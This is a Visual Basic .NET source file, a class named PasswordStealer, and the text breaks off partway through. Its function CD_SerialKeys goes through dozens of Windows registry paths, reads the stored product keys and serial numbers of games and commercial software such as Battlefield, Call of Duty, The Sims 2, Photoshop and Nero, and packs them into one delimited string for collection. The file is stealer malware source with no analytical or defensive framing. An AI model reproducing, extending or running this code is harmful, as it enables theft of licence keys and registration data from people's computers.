Imports Microsoft.Win32

Public Class PasswordStealer
    Public Function CD_SerialKeys() As String
        Dim daten As String = Nothing
        On Error Resume Next
        If My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Crysis\ergc", "", "error") <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Crysis Orginal;:;" & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Crysis\ergc", "", "error") & ";:;;:;~+~"
        End If
        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Electronic Arts\Electronic Arts\Crysis Wars\ergc", "", "error") <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Crysis Wars;:;" & My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Electronic Arts\Electronic Arts\Crysis Wars\ergc", "", "error") & ";:;;:;~+~"
        End If
        If My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 2142\ergc", "", "error") <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Battlefield 2142;:;" & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 2142\ergc", "", "error") & ";:;;:;~+~"
        End If
        If My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 2\ergc", "", "error") <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Battlefiel 2;:;" & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 2\ergc", "", "error") & ";:;;:;~+~"
        End If
        If My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 2 Special Forces\ergc", "", "error") <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Battlefield 2 Special Forces;:;" & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 2 Special Forces\ergc", "", "error") & ";:;;:;~+~"
        End If
        If My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\CRYTEK\FARCRY2\UBI.COM", "CDKey", "error") <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Farcry2;:;" & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\CRYTEK\FARCRY2\UBI.COM", "CDKey", "error") & ";:;;:;~+~"
        End If
        If My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty 4", "codkey", "error") <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Call of Duty 4;:;" & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty 4", "codkey", "error") & ";:;;:;~+~"
        End If
        If My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Need For Speed Hot Pursuit 2\ergc", "", "error") <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Need For Speed Hot Pursuit 2;:;" & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Need For Speed Hot Pursuit 2\ergc", "", "error") & ";:;;:;~+~"
        End If
        If My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Need for Speed ProStreet\ergc", "", "error") <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Need For Speed Pro Street;:;" & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Need for Speed ProStreet\ergc", "", "error") & ";:;;:;~+~"
        End If
        If My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 09\ergc", "", "error") <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Fifa 09;:;" & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 09\ergc", "", "error") & ";:;;:;~+~"
        End If
        If My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Adobe\Photoshop\9.0\Registration\Serial", "", "error") <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Adobe Photoshop 9.0;:;" & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Adobe\Photoshop\9.0\Registration\Serial", "", "error") & ";:;;:;~+~"
        End If
        'Tha Papst sachen
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Ubisoft\Splinter Cell Pandora Tomorrow", "CDKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Splinter Cell Pandora Tomorrow;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Ubisoft\Splinter Cell Pandora Tomorrow", "CDKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Ubisoft\Splinter Cell Chaos Theory\Keys", "DiscKey_SCCT", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Splinter Cell Chaos Theory;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Ubisoft\Splinter Cell Chaos Theory\Keys", "DiscKey_SCCT", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty", "codkey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Call of Duty;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty", "codkey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty United Offensive", "key", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Call of Duty United Offensive;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty United Offensive", "key", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty 2", "codkey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Call of Duty 2;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty 2", "codkey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty 4", "codkey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Call of Duty 4;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty 4", "codkey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty WAW", "codkey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Call of Duty WAW;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty WAW", "codkey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Dawn of War", "CDKEY", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Dawn of War;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Dawn of War", "CDKEY", Nothing) & ";:;;:;~+~"
        End If
        If Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Dawn of War - Dark Crusade", "CDKEY", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Dawn of War Dark Crusade;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Dawn of War - Dark Crusade", "CDKEY", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Dawn of War - Dark Crusade", "W40KCDKEY", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Dawn of War Crusade;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Dawn of War - Dark Crusade", "W40KCDKEY", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Dawn of War - Dark Crusade", "WXPCDKEY", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Dawn of War Crusade;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Dawn of War - Dark Crusade", "WXPCDKEY", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\SEGA\Medieval II Total War", "CDKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Medieval II Total War;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\SEGA\Medieval II Total War", "CDKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Adobe\Golive\5.0\Registration", "SERIAL", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Adobe Golive 5.0 :" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Adobe\Golive\5.0\Registration", "SERIAL", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\ahead\Installation\BAK\Nero 7\Info", "Serial7_1190555485", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Nero 7;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\ahead\Installation\BAK\Nero 7\Info", "Serial7_1190555485", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\ACD Systems\PicaView", "LicenseNumber", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "ACDSystems PicAView" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\ACD Systems\PicaView", "LicenseNumber", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Eugen Systems\ActOfWa", "RegNumber", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Act of War;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Eugen Systems\ActOfWa", "RegNumber", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Adobe\Photoshop\7.0\Registration", "SERIAL", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Photoshop 7.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Adobe\Photoshop\7.0\Registration", "SERIAL", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Elcom\Advanced PDF Password Recovery\Registration", "Code", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Advanced PDF Password Recovery :" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Elcom\Advanced PDF Password Recovery\Registration", "Code", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Elcom\Advanced PDF Password Recovery Pro\Registration", "Code", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Advanced PDF Password Recovery Pro;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Elcom\Advanced PDF Password Recovery Pro\Registration", "Code", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Elcom\Advanced ZIP Password Recovery\Registration", "Code", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Advanced ZIP Password Recovery\;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Elcom\Advanced ZIP Password Recovery\Registration", "Code", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Sunflowers\Anno 1701", "SerialNo", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Anno 1701;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Sunflowers\Anno 1701", "SerialNo", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\ashampoo\Ashampoo WinOptimizer Platinum 3", "Key", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Ashampoo WinOptimizer Platinum 3;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\ashampoo\Ashampoo WinOptimizer Platinum 3", "Key", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\@stake\LC5\Registration", "Unlock Code", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "AV Voice Changer;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\@stake\LC5\Registration", "Unlock Code", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 1942", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Battlefield 1942;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 1942", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 1942 Secret Weapons of WWII", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Battlefield 1942 Secret Weapons of WWII;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 1942 Secret Weapons of WWII", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 1942 The Road to Rome", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Battlefield 1942 The Road to Rome;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 1942 The Road to Rome", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Battlefield 2", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Battlefield 2;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Battlefield 2", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 2142", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Battlefield 2142:" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 2142", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA GAMES\Battlefield Vietnam", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Battlefield Vietnam;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA GAMES\Battlefield Vietnam", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA GAMES\Black and White", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Black and White;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA GAMES\Black and White", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\Black and White 2", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Black and White 2;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\Black and White 2", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Boulder Dash Rocks", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Boulder Dash Rocks;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Boulder Dash Rocks", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Burnout Paradise", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Burnout Paradise;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Burnout Paradise", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\TechSmith\Camtasia Studio\4.0", "RegisteredTo", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Camtasia Studio 4.0 Name;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\TechSmith\Camtasia Studio\4.0", "RegisteredTo", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\TechSmith\Camtasia Studio\4.0", "RegistrationKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Camtasia Studio 4.0 Key;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\TechSmith\Camtasia Studio\4.0", "RegistrationKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Techland\Chrome", "SerialNumber", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Chrome;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Techland\Chrome", "SerialNumber", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Codec Tweak Tool", "serial", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Codec Tweak Tool;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Codec Tweak Tool", "serial", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Generals", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Command and Conquer Generals;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Generals", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Command and Conquer Generals Zero Hour", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Command and Conquer Generals Zero Hour;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Command and Conquer Generals Zero Hour", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Westwood\Red Alert 2", "Serial", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Red Alert 2;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Westwood\Red Alert 2", "Serial", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Westwood\Red Alert", "Serial", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Red Alert;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Westwood\Red Alert", "Serial", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Westwood\Tiberian Sun", "Serial", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Command and Conquer Tiberian Sun;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Westwood\Tiberian Sun", "Serial", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Command and Conquer 3", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Command and Conquer 3;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Command and Conquer 3", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Command and Conquer 3", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Command and Conquer 3;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Command and Conquer 3", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Company of Heroes", "CoHProductKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Company of Heroes;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Company of Heroes", "CoHProductKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Company of Heroes", "CoHOFProductKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Company of Heroes;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Company of Heroes", "CoHOFProductKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Counter-Strike\Settings", "Key", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & " Counter-Strike;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Counter-Strike\Settings", "Key", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Crysis", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Crysis;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Crysis", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Cyberlink\PowerDVD", "CDKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Power DVD;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Cyberlink\PowerDVD", "CDKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Cyberlink\PowerBar", "CDKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "PowerBar;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Cyberlink\PowerBar", "CDKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\CyberLink\PowerProducer\3.0\UserReg", "SR_No", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "CyberLink PowerProducer;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\CyberLink\PowerProducer\3.0\UserReg", "SR_No", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Day of Defeat\Settings", "Key", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Day of Defeat;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Day of Defeat\Settings", "Key", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\The Battle for Middle-earth II", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Battle for Middle-earth II;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\The Battle for Middle-earth II", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Sims;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 University", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Sims 2 University;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 University", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Nightlife", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Sims 2 Nightlife;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Nightlife", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Open For Business", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Sims 2 Open For Business;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Open For Business", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Pets", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Sims 2 Pets;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Pets", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Seasons", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Sims 2 Seasons;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Seasons", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Glamour Life Stuff", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Sims 2 Glamour Life Stuff;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Glamour Life Stuff", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Celebration Stuff", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Sims 2 Celebration Stuff;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Celebration Stuff", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 H M Fashion Stuff", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Sims 2 H M Fashion Stuff;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 H M Fashion Stuff", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Family Fun Stuff", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "The Sims 2 Family Fun Stuff;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Family Fun Stuff", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\DVD Audio Extractor\Settings", "Reg Name", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "DVD Audio Extractor;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\DVD Audio Extractor\Settings", "Reg Name", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\DVD Audio Extractor\Settings", "Reg Number", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "DVD Audio Extractor Serial;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\DVD Audio Extractor\Settings", "Reg Number", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Sierra\Empire Earth II", "CDKey", Nothing) <> "" Then
